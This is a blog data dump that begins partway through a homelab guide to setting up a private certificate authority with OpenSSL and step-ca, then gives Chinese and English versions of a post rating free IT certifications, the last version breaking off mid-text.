&#x2F;usr&#x2F;local&#x2F;share&#x2F;ca-certificates&#x2F;homelab-root-ca.crt sudo update-ca-certificates iOS/iPadOS Email root-ca.crt to yourself or host it on a web server Open the file on your device Go to Settings → General → VPN &amp; Device Management Install the profile Go to Settings → General → About → Certificate Trust Settings Enable full trust for the certificate Android Copy root-ca.crt to your device Settings → Security → Encryption &amp; credentials → Install a certificate Select “CA certificate” Browse and select your certificate Configuring Services Nginx server &#123; listen 443 ssl; server_name homeserver.local; ssl_certificate &#x2F;path&#x2F;to&#x2F;homeserver.crt; ssl_certificate_key &#x2F;path&#x2F;to&#x2F;homeserver.key; # Optional: Include intermediate CA # ssl_certificate should contain: server cert + intermediate cert ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;localhost:8080; &#125; &#125; Apache &lt;VirtualHost *:443&gt; ServerName homeserver.local SSLEngine on SSLCertificateFile &#x2F;path&#x2F;to&#x2F;homeserver.crt SSLCertificateKeyFile &#x2F;path&#x2F;to&#x2F;homeserver.key SSLCertificateChainFile &#x2F;path&#x2F;to&#x2F;intermediate-ca.crt ProxyPass &#x2F; http:&#x2F;&#x2F;localhost:8080&#x2F; ProxyPassReverse &#x2F; http:&#x2F;&#x2F;localhost:8080&#x2F; &lt;&#x2F;VirtualHost&gt; Docker Compose version: &#39;3&#39; services: web: image: nginx:alpine ports: - &quot;443:443&quot; volumes: - .&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf - .&#x2F;homeserver.crt:&#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;cert.crt - .&#x2F;homeserver.key:&#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;cert.key Certificate Management Certificate Lifecycle flowchart TD A[\"📝 Create Certificate\"] --> B[\"🚀 Deploy to Server\"] B --> C[\"👁️ Monitor Expiration\"] C --> D{\"⏰ Approaching Expiration?\"} D -->|\"No\"| C D -->|\"Yes (at 2/3 lifetime)\"| E[\"🔄 Renew Certificate\"] E --> F[\"🚀 Redeploy to Server\"] F --> C style A fill:#e3f2fd style B fill:#e8f5e9 style C fill:#fff3e0 style D fill:#fff9c4 style E fill:#f3e5f5 style F fill:#e8f5e9 Renewal Script #!&#x2F;bin&#x2F;bash # renew-cert.sh DOMAIN&#x3D;&quot;homeserver.local&quot; CERT_DIR&#x3D;&quot;&#x2F;etc&#x2F;ssl&#x2F;homelab&quot; # Generate new key and CSR openssl genrsa -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.key 2048 openssl req -new -key $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.key \\ -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.csr \\ -subj &quot;&#x2F;CN&#x3D;$&#123;DOMAIN&#125;&quot; # Sign with intermediate CA openssl x509 -req -in $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.csr \\ -CA $&#123;CERT_DIR&#125;&#x2F;intermediate-ca.crt \\ -CAkey $&#123;CERT_DIR&#125;&#x2F;intermediate-ca.key \\ -CAcreateserial -out $&#123;CERT_DIR&#125;&#x2F;$&#123;DOMAIN&#125;.crt \\ -days 365 -sha256 # Reload nginx systemctl reload nginx echo &quot;Certificate renewed for $&#123;DOMAIN&#125;&quot; Automation with Cron # Add to crontab: renew 30 days before expiration 0 0 1 * * &#x2F;path&#x2F;to&#x2F;renew-cert.sh Security Best Practices ⚠️ Critical Security MeasuresProtect Your Root CA Private Key: Store offline on encrypted USB drive Never expose to network Use strong passphrase (AES-256) Keep multiple encrypted backups Consider hardware security module (HSM) for production Key Security Measures: Separate Root and Intermediate CAs Root CA: Offline, only for signing intermediate CAs Intermediate CA: Online, signs server certificates Use Strong Key Sizes Root CA: 4096-bit RSA or EC P-384 Intermediate CA: 4096-bit RSA or EC P-384 Server certificates: 2048-bit RSA minimum Set Appropriate Validity Periods Root CA: 10-20 years Intermediate CA: 5 years Server certificates: 1 year (easier to rotate) Implement Certificate Revocation Maintain Certificate Revocation List (CRL) Or use Online Certificate Status Protocol (OCSP) Audit and Monitor Log all certificate issuance Monitor for unauthorized certificates Regular security audits Common Issues and Solutions Issue: Browser Still Shows Warning Causes: CA certificate not installed correctly Certificate doesn’t include correct SAN (Subject Alternative Name) Accessing via IP but certificate only has DNS name Solution: # Check certificate SANs openssl x509 -in homeserver.crt -text -noout | grep -A1 &quot;Subject Alternative Name&quot; # Ensure certificate includes all access methods DNS.1 &#x3D; homeserver.local DNS.2 &#x3D; homeserver IP.1 &#x3D; 192.168.1.100 Issue: Certificate Chain Incomplete Solution: Create certificate bundle: cat homeserver.crt intermediate-ca.crt &gt; homeserver-bundle.crt Use bundle in server configuration. Issue: Private Key Permissions # Set correct permissions chmod 600 homeserver.key chown root:root homeserver.key Advanced: Automated Certificate Management SSH Certificates with step-ca If you initialized with --ssh, step-ca can also issue SSH certificates for password-less authentication. Setup SSH User Authentication: # On SSH server: Trust the user CA step ssh config --roots &gt; &#x2F;etc&#x2F;ssh&#x2F;ssh_user_ca.pub echo &#39;TrustedUserCAKeys &#x2F;etc&#x2F;ssh&#x2F;ssh_user_ca.pub&#39; | sudo tee -a &#x2F;etc&#x2F;ssh&#x2F;sshd_config sudo systemctl restart sshd # On client: Get SSH user certificate step ssh certificate alice@homelab.local id_ecdsa ✔ Provisioner: admin@homelab.local (JWK) ✔ Please enter the password to decrypt the provisioner key: ******** ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 ✔ Private Key: id_ecdsa ✔ Certificate: id_ecdsa-cert.pub ✔ SSH Agent: yes # Inspect certificate cat id_ecdsa-cert.pub | step ssh inspect Setup SSH Host Authentication: # On SSH server: Get host certificate cd &#x2F;etc&#x2F;ssh sudo step ssh certificate --host --sign server.homelab.local ssh_host_ecdsa_key.pub # Configure SSHD to use certificate echo &#39;HostCertificate &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key-cert.pub&#39; | sudo tee -a &#x2F;etc&#x2F;ssh&#x2F;sshd_config sudo systemctl restart sshd # On clients: Trust the host CA step ssh config --host --roots &gt;&gt; ~&#x2F;.ssh&#x2F;known_hosts # Prepend with: @cert-authority * Automate SSH Host Certificate Renewal: # Create weekly renewal cron cat &lt;&lt;EOF | sudo tee &#x2F;etc&#x2F;cron.weekly&#x2F;renew-ssh-cert #!&#x2F;bin&#x2F;sh export STEPPATH&#x3D;&#x2F;root&#x2F;.step cd &#x2F;etc&#x2F;ssh &amp;&amp; step ssh renew ssh_host_ecdsa_key-cert.pub ssh_host_ecdsa_key --force exit 0 EOF sudo chmod 755 &#x2F;etc&#x2F;cron.weekly&#x2F;renew-ssh-cert Using step-ca with nginx-proxy-manager # 1. Get certificate from step-ca step ca certificate npm.homelab.local npm.crt npm.key # 2. In nginx-proxy-manager UI: # - SSL Certificates → Add SSL Certificate → Custom # - Upload npm.crt and npm.key # - Set up automatic renewal with step ca renew --daemon Using step-ca with Home Assistant # configuration.yaml http: ssl_certificate: &#x2F;ssl&#x2F;homeassistant.crt ssl_key: &#x2F;ssl&#x2F;homeassistant.key # Get certificate # step ca certificate homeassistant.local &#x2F;ssl&#x2F;homeassistant.crt &#x2F;ssl&#x2F;homeassistant.key Monitoring and Management # Check certificate expiration step certificate inspect homeserver.crt --short X.509v3 TLS Certificate (ECDSA P-256) [Serial: 7720...1576] Subject: homeserver.local Issuer: Home Lab Intermediate CA Valid from: 2025-05-15T00:59:37Z to: 2025-05-16T01:00:37Z # Revoke a certificate (passive revocation - blocks renewal) step ca revoke --cert homeserver.crt --key homeserver.key ✔ CA: https:&#x2F;&#x2F;ca.homelab.local:8443 Certificate with Serial Number 30671613121311574910895916201205874495 has been revoked. # List provisioners step ca provisioner list Comparison: Private CA vs Let’s Encrypt Feature Private CA Let’s Encrypt Cost Free Free Internal IPs ✅ Yes ❌ No .local domains ✅ Yes ❌ No Offline operation ✅ Yes ❌ No Auto-renewal Manual/Custom ✅ Built-in Public trust ❌ No ✅ Yes Setup complexity Medium Low Maintenance Manual Automated When to use Private CA: Internal services only Private IP addresses .local or custom TLDs Air-gapped networks Full control needed When to use Let’s Encrypt: Public-facing services Public domain names Want automatic renewal Don’t want to manage CA infrastructure Resources OpenSSL Documentation: Complete OpenSSL reference easy-rsa: Simplified CA management step-ca: Modern CA with ACME support PKI Tutorial: Comprehensive PKI guide Conclusion Setting up a private CA might seem daunting at first, but once configured, it eliminates those annoying browser warnings and provides proper encryption for your homelab services. The initial time investment pays off with a more professional and secure home network. Key Takeaways: Private CAs enable trusted HTTPS for internal services step-ca is recommended for modern, automated certificate management Two-tier hierarchy (Root + Intermediate) provides better security Install root CA certificate on all your devices once Automate certificate renewal to avoid expiration issues (step-ca makes this easy) Keep root CA private key offline and secure SSH certificates eliminate password authentication and improve security Quick Start Recommendation: For most homelabs, use step-ca: step ca init --acme --ssh (one command setup) step certificate install $(step path)/certs/root_ca.crt (trust on all devices) step ca certificate service.local service.crt service.key (get certificates) step ca renew service.crt service.key --daemon (automatic renewal) Start small with a single service, get comfortable with the process, then expand to your entire homelab. Your future self will thank you when you’re not clicking through security warnings anymore! 🔒","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"},{"name":"Homelab","slug":"Homelab","permalink":"https://neo01.com/tags/Homelab/"},{"name":"PKI","slug":"PKI","permalink":"https://neo01.com/tags/PKI/"}]},{"title":"真正免費的 IT 考試和證書","slug":"2024/02/Free-IT-Exams-and-Certificates-For-Real-zh-TW","date":"un44fin44","updated":"un22fin22","comments":true,"path":"/zh-TW/2024/02/Free-IT-Exams-and-Certificates-For-Real/","permalink":"https://neo01.com/zh-TW/2024/02/Free-IT-Exams-and-Certificates-For-Real/","excerpt":"發現真正免費的監考 IT 認證：ISC2、Google Cloud、Cisco 等，提升職業競爭力。","text":"監考與非監考考試 網路上有許多 IT 認證可供選擇，但其中一些證書可以通過非監考考試獲得，這意味著你只需觀看幾個影片或參加可以無限次重試的測驗就能獲得證書。然而，本頁列出的一些證書是監考的但仍然免費。與非監考相比，監考考試證書獲得更廣泛的認可。 監考考試是在嚴格的安全措施下進行的受監督評估，以確保考試的完整性，包括通過政府核發的身分證或生物識別認證進行身分驗證、由真人監考員或 AI 驅動的監控系統進行即時監控，以及在實體測試中心或安全的線上平台中的受控測試環境。這些考試限制存取外部資源，執行具有防作弊措施的時間限制，並且通常只允許單次嘗試或有限的重試。相比之下， 非監考評估是沒有監督的自定進度線上評估，不需要身分驗證，在大多數情況下提供無限次重試，通常允許存取外部資源，並允許按照自己的節奏和地點完成，作為線上課程或培訓模組的一部分。監考認證在業界具有顯著更高的價值，因為它們在受控條件下提供可驗證的知識和技能證明，使它們比非監考的對應證書更受雇主和同行信任。 本頁的評分是主觀的，基於證書的價值及其根據我的知識的認可度。 💡 專業建議優先考慮監考認證 - 它們對雇主來說具有顯著更高的價值，值得額外的努力！ 監考 網路安全 🏆 ISC2 網路安全認證 (CC) ISC2 網路安全認證 (CC) 是由世界知名的 ISC2（國際資訊系統安全認證聯盟）頒發的入門級證書。此外，ISC2 還頒發其他著名的證書，如 CISSP 和 CCSK，這些證書被業界廣泛接受。 該證書自 2022 年起免費。註冊後，你將獲得一個免費的自學課程，包含課前和課後評估。不參加任何額外課程也有可能通過考試。你將參加考試的考試中心具有高安全性功能，包括掌紋掃描等生物識別認證方法 - 所以不要讓它讓你措手不及而緊張！ ⚠️ 考試日提醒 攜帶有效的政府核發身分證進行生物識別驗證 你無法在提交後檢閱答案 - 提交前請仔細檢查！ 可能需要掌紋掃描 - 不要驚訝！ 免費考試但不要太興奮！你仍然需要每年支付 50 美元才能保留那個閃亮的新認證。 💰 年費提醒雖然考試是免費的，但維持此認證需要每年 50 美元的費用。請相應地編列預算！ 今天就開始！ISC2 網路安全認證 優點： 廣受認可 考試在考試中心進行 缺點： 認證需要年費 認證 每年 50 美元 續期 每年 50 美元 價值 ⭐⭐⭐⭐ 雲端 🏆 Google Cloud 認證 Google Cloud 通過其「2025 年獲得認證」計畫提供免費培訓，這是一項專為 Google Cloud 客戶提供的計畫。該計畫提供結構化的學習路徑來建立雲端運算技能，在 2025 年的多個批次中，每週最多投入 9 小時，持續 9 到 11 週。參與者可以免費存取 Google Cloud Skills Boost 上的 980 多個實驗室和課程。該計畫的先前版本，如 2024 年和 2025 年，提供了免費的考試券，涵蓋了 Associate Cloud Engineer 和 Professional Cloud Architect 等認證的費用。 開始你的 Google Cloud 認證之旅： https://cloud.google.com/innovators/getcertified（需要登入） 優點： 通過 Google Cloud Skills Boost 提供免費的高品質培訓和實驗室 根據過去的計畫版本，有可能獲得免費考試券 在業界廣受認可 缺點： 僅限擁有企業電子郵件的 Google Cloud 客戶 2025 年不保證提供考試券；可能需要付費 📧 資格要求此計畫需要作為 Google Cloud 客戶的企業電子郵件地址。個人 Gmail 帳戶不符合資格。 認證 免費培訓；可能有免費券 續期 重新參加考試或持續學習 價值 ⭐⭐⭐⭐ 非監考 📝 關於非監考認證這些認證更容易獲得，但在就業市場上的價值較低。它們非常適合學習，但可能不如監考替代方案那樣讓雇主印象深刻。 網路安全 💰 Cisco 道德駭客證書 Cisco NetAcad 提供全面的道德駭客證書，包含 70 小時的優質培訓材料，涵蓋滲透測試、漏洞評估和道德駭客方法論。 https://www.netacad.com/courses/ethical-hacker 認證 免費 續期 不適用 價值 ⭐⭐⭐⭐ DevOps 💰 GitLab 大學課程 GitLab 大學提供免費的非監考課程，涵蓋 GitLab 基礎知識、遷移指南、GitLab Duo、敏捷組合管理、CI/CD 和安全最佳實踐。這些課程提供全面的學習，但沒有正式認證。 https://university.gitlab.com/ 認證 免費 續期 不適用 價值 ⭐⭐ 資料庫 💰 Neo4j 認證 Neo4j 提供免費認證，包括 Neo4j 認證專業人員和圖資料科學認證。這些認證驗證圖資料庫管理、Cypher 查詢語言和圖資料科學技術的技能。 https://graphacademy.neo4j.com/certifications/neo4j-certification/ https://graphacademy.neo4j.com/certifications/gds-certification/ 認證 免費 續期 不適用 價值 ⭐⭐ SRE 💰 New Relic 驗證基礎 New Relic 驗證基礎涵蓋全面的可觀察性培訓，包括可觀察性基礎知識、New Relic 平台 UI 和功能、配置資料、效能監控和全堆疊可觀察性實踐。 https://learn.newrelic.com/page/new-relic-verified-foundation-nvf 認證 免費 續期 不適用 價值 ⭐⭐ 專案管理 💰 六標準差白帶 來自 Six Sigma Online 的六標準差白帶證書是一個基礎認證，向學習者介紹六標準差的原則和方法論，這是一種資料驅動的品質改進方法。要獲得此認證，學生必須通過多選題考試，但不必通過監考測試或專案應用來展示他們的技能。因此，與本頁列出的其他證書相比，此證書的評分相對較低。儘管如此，白帶證書仍然提供了對定義、測量、分析、改進和控制 (DMAIC) 概念的紮實介紹，以及其在各個行業中的應用概述。 https://www.sixsigmaonline.org/six-sigma-white-belt-certification/ 優點： 100% 免費 缺點： 相對較不知名 線上測驗 認證 免費 續期 永不過期 價值 ⭐ 教育 💰 Google 教育版 Google 教育版提供免費認證，包括 Gemini 教育工作者和 Gemini 大學學生。這些認證展示了對 Gemini 的理解以及負責任地整合 Google AI 以提高生產力、學生成功和創新學習體驗。 https://educertifications.google/ 優點： 100% 免費 專注於教育中的 AI 整合 Google 支持的認證 缺點： 非監考 僅限於教育部門 認證 免費 續期 不適用 價值 ⭐⭐ 線上行銷 💰 SkillShop 上的 Google SkillShop 上的 Google 免費證書是由 Google 設計並在線上學習平台 SkillShop 上提供的一系列認證。這些認證展示了你在與 Google 產品和技術相關的特定領域的知識和技能，例如數位分析、廣告和資料視覺化。培訓資源是免費的。儘管你學到的知識與 Google 的產品相關，但它仍然提供了一個很好的機會來了解這些產品如何利用人工智慧。 https://skillshop.exceedlms.com/ 優點： 100% 免費 超過 20 個證書 公司知名度高 缺點： 線上測驗 知識與 Google 的產品相關 認證 免費 續期 1 年 價值 ⭐⭐ 總結 類別 名稱 考試 認證 續期 價值 網路安全 ISC2 網路安全認證 (CC) 免費 每年 50 美元 每年 50 美元 ⭐⭐⭐⭐ 網路安全 Cisco 道德駭客 免費 免費 不適用 ⭐⭐⭐⭐ DevOps GitLab 認證助理 免費 免費 3 年 ⭐⭐⭐ DevOps GitLab 大學課程 免費 免費 不適用 ⭐⭐ 資料庫 Neo4j 認證 免費 免費 不適用 ⭐⭐ SRE New Relic 驗證基礎 免費 免費 不適用 ⭐⭐ 雲端 Google Cloud 免費 免費 2 年 ⭐⭐⭐⭐ 教育 Google 教育版 免費 免費 不適用 ⭐⭐ 行銷 Google 廣告 免費 免費 1 年 ⭐⭐ 專案管理 六標準差白帶 免費 免費 永不過期 ⭐ 還有其他儲存庫維護免費 IT 證書清單： https://github.com/cloudcommunity/Free-Certifications","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"}],"lang":"zh-TW"},{"title":"Free IT Examinations and Certificates for Real","slug":"2024/02/Free-IT-Exams-and-Certificates-For-Real","date":"un44fin44","updated":"un22fin22","comments":true,"path":"2024/02/Free-IT-Exams-and-Certificates-For-Real/","permalink":"https://neo01.com/2024/02/Free-IT-Exams-and-Certificates-For-Real/","excerpt":"Discover genuinely free proctored IT certifications from ISC2, Google Cloud, Cisco, and more to boost your career without breaking the bank.","text":"Proctored vs Non-Proctored Examinations There are many IT certifications available online, but some of these certificates can earn with non-proctored examinations, meaning that you can get the certificates simply by watching a few videos or taking a quiz with unlimited retries. However, some of the certificates listed on this page are proctored but still free. Proctored Examinations certificates are more widely recognized compared to non-proctored. Proctored examinations are supervised assessments conducted under strict security measures to ensure exam integrity, featuring identity verification through government-issued ID or biometric authentication, live monitoring by human proctors or AI-powered surveillance systems, and controlled testing environments in physical test centers or secure online platforms. These exams restrict access to external resources, enforce time limits with anti-cheating measures, and typically allow single attempts or limited retries. In contrast, non-proctored assessments are self-paced online evaluations without supervision that require no identity verification, offer unlimited retries in most cases, often permit access to external resources, and allow completion at your own pace and location as part of online courses or training modules. Proctored certifications carry significantly more weight in the industry because they provide verifiable proof of knowledge and skills under controlled conditions, making them more trusted by employers and peers compared to their non-proctored counterparts. Rating on this page is subjective, based on the value of the certificate and its recognition according to my knowledge. 💡 Pro TipFocus on proctored certifications first - they carry significantly more weight with employers and are worth the extra effort! Proctored Cybersecurity 🏆 Certified in Cybersecurity (CC) from ISC2 ISC2 Certified in Cybersecurity (CC) is an entry-level credential issued by the world-renowned ISC2 (International Information Systems Security Certification Consortium). Additionally, ISC2 issues other notable certificates, such as CISSP and CCSK, which are widely accepted by industries. The certificate is free since 2022. After registration, you’ll receive a free self-learning course with pre- and post-course assessments. It is possible to pass the exam without taking any additional courses. The examination center where you’ll be taking the test has high-security features, including biometric authentication methods like palm scanning – so don’t let it catch you off guard and get nervous! ⚠️ Exam Day Reminders Bring valid government-issued ID for biometric verification You CANNOT review answers after submission - double-check before submitting! Palm scanning may be required - don't be surprised! Free exam but don’t get too excited! You’ll still need to shell out $50 a year for the privilege of holding on to that shiny new certification. 💰 Annual Fee AlertWhile the exam is free, maintaining this certification requires a $50 annual fee. Budget accordingly! Get started today! Certified in Cybersecurity from ISC2 Pros: Well recognized The exam is taken at an exam center Cons: An annual fee is required for the certification Certification USD 50/year Renewal USD 50/year Value ⭐⭐⭐⭐ Cloud 🏆 Google Cloud Certifications Google Cloud offers free training through its “Get Certified in 2025” program, an initiative exclusive to Google Cloud customers. This program provides structured learning paths to build skills in cloud computing, with a commitment of up to 9 hours per week over 9 to 11 weeks across multiple cohorts in 2025. Participants can access over 980 labs and courses on Google Cloud Skills Boost at no cost. Previous iterations of the program, such as in 2024 and 2025, have offered free exam vouchers, covering costs for certifications like Associate Cloud Engineer and Professional Cloud Architect. Start your journey with Google Cloud certifications: https://cloud.google.com/innovators/getcertified (requires sign-in) Pros: Free high-quality training and labs via Google Cloud Skills Boost Potential for free exam vouchers based on past program iterations Well recognized in the industry Cons: Exclusive to Google Cloud customers with corporate email Exam vouchers not guaranteed for 2025; fees may apply 📧 Eligibility RequirementThis program requires a corporate email address as a Google Cloud customer. Personal Gmail accounts won't qualify. Certification Free training; potential free vouchers Renewal Retake exam or continuous learning Value ⭐⭐⭐⭐ Non-Proctored 📝 About Non-Proctored CertificationsThese certifications are easier to obtain but carry less weight in the job market. They're excellent for learning but may not impress employers as much as proctored alternatives. Cybersecurity 💰 Cisco Certificate in Ethical Hacking Cisco NetAcad offers a comprehensive Certificate in Ethical Hacking with 70 hours of excellent training materials covering penetration testing, vulnerability assessment, and ethical hacking methodologies. https://www.netacad.com/courses/ethical-hacker Certification Free Renewal N/A Value ⭐⭐⭐⭐ DevOps 💰 GitLab University Courses GitLab University provides free non-proctored courses covering GitLab fundamentals, migration guides, GitLab Duo, Agile Portfolio Management, CI/CD, and Security best practices. These courses offer comprehensive learning without formal certification. https://university.gitlab.com/ Certification Free Renewal N/A Value ⭐⭐ Database 💰 Neo4j Certifications Neo4j offers free certifications including Neo4j Certified Professional and Graph Data Science Certification. These validate skills in graph database management, Cypher query language, and graph data science techniques. https://graphacademy.neo4j.com/certifications/neo4j-certification/ https://graphacademy.neo4j.com/certifications/gds-certification/ Certification Free Renewal N/A Value ⭐⭐ SRE 💰 New Relic Verified Foundation New Relic Verified Foundation covers comprehensive observability training including Observability Fundamentals, New Relic Platform UI and Capabilities, Configuring Data, Performance Monitoring, and Full Stack Observability Practices. https://learn.newrelic.com/page/new-relic-verified-foundation-nvf Certification Free Renewal N/A Value ⭐⭐ Project Management 💰 Six Sigma White Belt The Six Sigma White Belt Certificate from Six Sigma Online is a foundational certification that introduces learners to the principles and methodologies of Six Sigma, a data-driven approach to quality improvement. To earn this certification, students must pass a multiple-choice examination, but do not have to demonstrate their skills with a proctored test or project application. As a result, the rating for this certificate is relatively low compared to other certificates listed on this page. Nevertheless, the White Belt Certificate still provides a solid introduction to the concepts of Define, Measure, Analyze, Improve, and Control (DMAIC), as well as an overview of its application in various industries. https://www.sixsigmaonline.org/six-sigma-white-belt-certification/ Pros: 100% Free Cons: Relatively less well recognized Online quiz Certification Free Renewal Never expires Value ⭐ Education 💰 Google for Education Google for Education offers free certifications including Gemini Educator and Gemini University Student. These certifications demonstrate understanding of Gemini and responsible integration of Google AI for enhanced productivity, student success, and innovative learning experiences. https://educertifications.google/ Pros: 100% Free Focus on AI integration in education Google-backed certification Cons: Non-proctored Limited to education sector Certification Free Renewal N/A Value ⭐⭐ Online Marketing 💰 Google on SkillShop Google Free Certificates on SkillShop are a series of certifications designed by Google and made available on the online learning platform, SkillShop. These certifications demonstrate your knowledge and skills in specific areas related to Google products and technologies, such as digital analytics, advertising, and data visualization. The training resources are free. Although the knowledge you learn is related to Google’s products, it still provides a good chance to understand how those products utilize artificial intelligence. https://skillshop.exceedlms.com/ Pros: 100% Free Over 20 certificates The company is well-known Cons: Online quiz Knowledge is related to Google’s products Certification Free Renewal 1 year Value ⭐⭐ Summary Category Name Exam Certification Renewal Value Cybersecurity ISC2 Certified in Cybersecurity (CC) Free USD 50/year USD 50/year ⭐⭐⭐⭐ Cybersecurity Cisco Ethical Hacking Free Free N/A ⭐⭐⭐⭐ DevOps GitLab Certified Associate Free Free 3 years ⭐⭐⭐ DevOps GitLab University Courses Free Free N/A ⭐⭐ Database Neo4j Certifications Free Free N/A ⭐⭐ SRE New Relic Verified Foundation Free Free N/A ⭐⭐ Cloud Google Cloud Free Free 2 years ⭐⭐⭐⭐ Education Google for Education Free Free N/A ⭐⭐ Marketing Google Ad Free Free 1 year ⭐⭐ Project Management Six Sigma White Belt Free Free Never expires ⭐ There are other repositories that maintain lists of free IT certificates: https://github.com/cloudcommunity/Free-Certifications","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/tags/Cybersecurity/"}]},{"title":"真正免费的 IT 考试和证书","slug":"2024/02/Free-IT-Exams-and-Certificates-For-Real-zh-CN","date":"un44fin44","updated":"un22fin22","comments":true,"path":"/zh-CN/2024/02/Free-IT-Exams-and-Certificates-For-Real/","permalink":"https://neo01.com/zh-CN/2024/02/Free-IT-Exams-and-Certificates-For-Real/","excerpt":"发现真正免费的监考 IT 认证：ISC2、Google Cloud、Cisco 等，提升职业竞争力。","text":"监考与非监考考试 网络上有许多 IT 认证可供选择，但其中一些证书可以通过非监考考试获得，这意味着您只需观看几部视频或进行无限次重试的测验即可获得证书。然而，本页列出的一些证书是经过监考的，但仍然免费。与非监考证书相比，监考考试证书获得更广泛的认可。 监考考试是在严格的安全措施下进行的监督评估，以确保考试的完整性，包括通过政府核发的身份证件或生物识别验证进行身份验证、由真人监考员或 AI 驱动的监控系统进行实时监控，以及在实体测试中心或安全在线平台中的受控测试环境。这些考试限制访问外部资源、执行时间限制并采取防作弊措施，通常只允许单次尝试或有限的重试。相比之下， 非监考评估是无监督的自定进度在线评估，不需要身份验证，在大多数情况下提供无限次重试，通常允许访问外部资源，并允许按照自己的进度和地点完成，作为在线课程或培训模块的一部分。监考认证在业界具有更高的价值，因为它们在受控条件下提供可验证的知识和技能证明，使其比非监考认证更受雇主和同行信任。 本页的评分是主观的，基于证书的价值及其根据我的知识的认可度。 💡 专业建议优先考虑监考认证 - 它们对雇主更有价值，值得付出额外的努力！ 监考 网络安全 🏆 ISC2 网络安全认证 (CC) ISC2 网络安全认证 (CC) 是由世界知名的 ISC2（国际信息系统安全认证联盟）颁发的入门级证书。此外，ISC2 还颁发其他著名的证书，如 CISSP 和 CCSK，这些证书被业界广泛接受。 该证书自 2022 年起免费。注册后，您将获得免费的自学课程，包含课前和课后评估。无需参加任何额外课程即可通过考试。您将参加考试的考试中心具有高安全性功能，包括掌纹扫描等生物识别验证方法 - 所以不要让它吓到您而感到紧张！ ⚠️ 考试日提醒 携带有效的政府核发身份证件进行生物识别验证 您无法在提交后检阅答案 - 提交前请仔细检查！ 可能需要掌纹扫描 - 不要感到惊讶！ 考试免费，但不要太兴奋！您仍然需要每年支付 50 美元才能保留这个闪亮的新认证。 💰 年费提醒虽然考试免费，但维持此认证需要每年支付 50 美元。请相应地编列预算！ 立即开始！ISC2 网络安全认证 优点： 广受认可 考试在考试中心进行 缺点： 认证需要年费 认证 每年 50 美元 续约 每年 50 美元 价值 ⭐⭐⭐⭐ 云端 🏆 Google Cloud 认证 Google Cloud 通过其&quot;2025 年获得认证&quot;计划提供免费培训，这是专为 Google Cloud 客户提供的独家计划。该计划提供结构化的学习路径，以建立云计算技能，承诺在 2025 年的多个批次中，每周投入最多 9 小时，持续 9 到 11 周。参与者可以免费访问 Google Cloud Skills Boost 上的 980 多个实验室和课程。该计划的先前版本，例如 2024 年和 2025 年，提供了免费的考试券，涵盖了助理云工程师和专业云架构师等认证的费用。 开始您的 Google Cloud 认证之旅： https://cloud.google.com/innovators/getcertified（需要登录） 优点： 通过 Google Cloud Skills Boost 提供免费的高质量培训和实验室 根据过去的计划版本，可能提供免费考试券 在业界广受认可 缺点： 仅限使用企业电子邮件的 Google Cloud 客户 2025 年不保证提供考试券；可能需要付费 📧 资格要求此计划需要作为 Google Cloud 客户的企业电子邮件地址。个人 Gmail 账户不符合资格。 认证 免费培训；可能提供免费券 续约 重新参加考试或持续学习 价值 ⭐⭐⭐⭐ 非监考 📝 关于非监考认证这些认证较容易获得，但在就业市场上的价值较低。它们非常适合学习，但可能不如监考替代方案那样令雇主印象深刻。 网络安全 💰 Cisco 道德黑客证书 Cisco NetAcad 提供全面的道德黑客证书，包含 70 小时的优质培训材料，涵盖渗透测试、漏洞评估和道德黑客方法论。 https://www.netacad.com/courses/ethical-hacker 认证 免费 续约 不适用 价值 ⭐⭐⭐⭐ DevOps 💰 GitLab 大学课程 GitLab 大学提供免费的非监考课程，涵盖 GitLab 基础知识、迁移指南、GitLab Duo、敏捷组合管理、CI/CD 和安全最佳实践。这些课程提供全面的学习，但没有正式认证。 https://university.gitlab.com/ 认证 免费 续约 不适用 价值 ⭐⭐ 数据库 💰 Neo4j 认证 Neo4j 提供免费认证，包括 Neo4j 认证专业人员和图形数据科学认证。这些认证验证图形数据库管理、Cypher 查询语言和图形数据科学技术的技能。 https://graphacademy.neo4j.com/certifications/neo4j-certification/ https://graphacademy.neo4j.com/certifications/gds-certification/ 认证 免费 续约 不适用 价值 ⭐⭐ SRE 💰 New Relic 验证基础 New Relic 验证基础涵盖全面的可观察性培训，包括可观察性基础知识、New Relic 平台 UI 和功能、配置数据、性能监控和全栈可观察性实践。 https://learn.newrelic.com/page/new-relic-verified-foundation-nvf 认证 免费 续约 不适用 价值 ⭐⭐ 项目管理 💰 六西格玛白带 Six Sigma Online 的六西格玛白带证书是一个基础认证，向学习者介绍六西格玛的原则和方法论，这是一种数据驱动的质量改进方法。要获得此认证，学生必须通过多项选择考试，但不必通过监考测试或项目应用来展示他们的技能。因此，与本页列出的其他证书相比，此证书的评分相对较低。尽管如此，白带证书仍然提供了对定义、测量、分析、改进和控制 (DMAIC) 概念的扎实介绍，以及其在各个行业中的应用概述。 https://www.sixsigmaonline.org/six-sigma-white-belt-certification/ 优点： 100% 免费 缺点： 相对较不知名 在线测验 认证 免费 续约 永不过期 价值 ⭐ 教育 💰 Google 教育版 Google 教育版提供免费认证，包括 Gemini 教育工作者和 Gemini 大学学生。这些认证展示了对 Gemini 的理解以及负责任地整合 Google AI 以提高生产力、学生成功和创新学习体验。 https://educertifications.google/ 优点： 100% 免费 专注于教育中的 AI 